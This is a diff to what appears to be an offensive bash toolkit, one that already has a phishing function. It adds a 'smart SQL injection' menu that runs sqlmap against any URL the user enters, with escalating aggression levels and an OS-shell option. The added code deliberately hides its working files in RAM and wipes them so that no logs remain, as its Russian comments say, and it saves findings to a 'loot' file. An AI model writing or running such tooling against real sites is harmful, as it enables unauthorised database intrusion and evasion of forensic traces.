@@ -207,3 +207,53 @@ run_phishing() {
 }
 
 
+run_sqlmap() {
+    clear
+    echo -e "${R}--------------------------------------------------${NC}"
+    echo -e "${R}        PRIME MASTER: SMART SQL INJECTION         ${NC}"
+    echo -e "${R}--------------------------------------------------${NC}"
+
+    read -p "Enter Target URL: " target_url
+    [[ -z "$target_url" ]] && return
+
+    echo -e "${Y}[?] Select Aggression Level:${NC}"
+    echo -e " 1) Stealth  (Level 1, Risk 1) - Default"
+    echo -e " 2) Advanced (Level 3, Risk 2)"
+    echo -e " 3) Insane   (Level 5, Risk 3)"
+    read -p ">> " opt
+
+    local args="--batch --random-agent --dbms=auto --shell"
+    
+    # Эвристическая настройка параметров
+    case "$opt" in
+        2) args="$args --level 3 --risk 2 --threads 5" ;;
+        3) args="$args --level 5 --risk 3 --threads 10 --flush-session" ;;
+        *) args="$args --level 1 --risk 1" ;;
+    esac
+
+    # Стелс-настройка: перенаправляем output во временную память (RAM), 
+    # чтобы не изнашивать память телефона и не оставлять логов в /root/.local/share/sqlmap
+    local tmp_dir="/dev/shm/.sqlmap_$RANDOM"
+    mkdir -p "$tmp_dir"
+
+    echo -e "${G}[*] Launching SQLmap Engine with $args...${NC}"
+    
+    # Запуск
+    sqlmap -u "$target_url" $args --output-dir="$tmp_dir"
+
+    # Проверка результатов
+    if [[ -d "$tmp_dir" ]]; then
+        local log_file=$(find "$tmp_dir" -name "log" -type f 2>/dev/null)
+        if [[ -n "$log_file" ]]; then
+            echo -e "${G}[!!!] VULNERABILITY FOUND! Summary saved to loot.${NC}"
+            cat "$log_file" >> /root/prime_loot/sql_success.txt
+        fi
+        # Полная зачистка следов в RAM
+        rm -rf "$tmp_dir"
+    fi
+
+    echo -e "\n${Y}--------------------------------------------------${NC}"
+    pause
+}
+
+
